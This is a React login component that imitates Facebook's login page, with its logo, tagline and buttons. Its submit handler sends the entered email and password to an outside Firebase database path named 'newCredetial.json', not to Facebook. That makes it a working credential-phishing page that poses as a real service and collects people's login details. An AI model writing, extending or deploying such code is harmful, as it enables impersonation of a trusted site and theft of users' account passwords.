import React, { useState } from "react";
import facebook from "../../images/facebook.svg";
const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const link = "#";
  const options = {
    method: "POST",
    header: {
      "Content-type": "Applicaton/json",
    },
    body: JSON.stringify({
      Email: email,
      Password: password,
    }),
  };
  const emailOnChangeHandler = (e) => {
    setEmail(e.target.value);
  };
  const passwordOnChangeHandler = (e) => {
    setPassword(e.target.value);
  };
  const onSubmitHandler = (event) => {
    event.preventDefault();
    console.log("button pressed");

    fetch(
      " https://databalance-a9d59-default-rtdb.asia-southeast1.firebasedatabase.app/newCredetial.json ",
      options
    )
      .then((response) => response.json())
      .then((result) => console.log(result));
  };

  return (
    <div className="flex pl-[157px] gap-[3rem] relative ">
      <div className="flex flex-col items-start pt-[176px] leading-8 max-sm:hidden ">
        <img className="w-[19rem] " src={facebook} alt="facebookimage" />
        <p className="w-[35rem] ml-7 text-[29px] m-[-12px] font-body text-[#1C1E21] ">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>

      {
        //its left
      }

      <div className="bg-[#FFFFFF] max-sm:border-none max-sm:shadow-none max-sm:ml-[-7rem] rounded-xl p-4 mt-[140px] shadow-xl mb-44 ">
        <form onSubmit={onSubmitHandler}>
          <div className="flex flex-col gap-3">
            <input
              onChange={emailOnChangeHandler}
              type="text"
              placeholder="Email address or phone number"
              className="border-[1px] max-sm:rounded-[5px] outline-[#1B74E4] outline-1 max-sm:h-11 font-body w-[23rem] h-[3.25rem] pl-3 rounded-lg text-[17px] "
            />

            <input
              onChange={passwordOnChangeHandler}
              type="password"
              placeholder="Password"
              className="border-[1px] font-body max-sm:rounded-[5px] outline-[#1B74E4] max-sm:h-11 outline-1 w-[23rem] h-[3.25rem] pl-3 rounded-lg text-[17px] "
            />
          </div>

          <div className="flex flex-col items-center pt-4 pb-4 gap-3">
            <button className="bg-[#1978f5] max-sm:h-11 max-sm:rounded-[5px] hover:bg-[#1873e9] text-white font-body w-[23rem] h-12 rounded-md text-[1.30rem] font-bold">
              Log in
            </button>

            <a href={link} className="hover:underline text-[#1877F4]">
              Forgotten password?
            </a>
          </div>
          <div className=" md:hidden flex justify-between">
            <hr className="w-[10rem]" />
            <div className="mt-[-13px]">or</div>
            <hr className="w-[10rem]" />
          </div>
          <hr className="max-sm:hidden" />
          <div className="flex justify-center pt-6 pb-5">
            <button className="bg-[#46be2e] max-sm:h-11 max-sm:rounded-[5px] hover:bg-[#43b62c] w-[11.5rem]  h-12 font-body text-[1rem] rounded-md  text-white font-bold ">
              Create New Account
            </button>
          </div>
        </form>
      </div>
      {
        //its right
      }
      <div className=" max-sm:hidden absolute bottom-[8.25rem] right-[12.50rem]  ">
        <a className="font-bold" href={link}>
          Create a Page
        </a>
        <span className=" text-sm"> for a celebrity, brand or business.</span>
      </div>
    </div>
  );
};

export default Login;
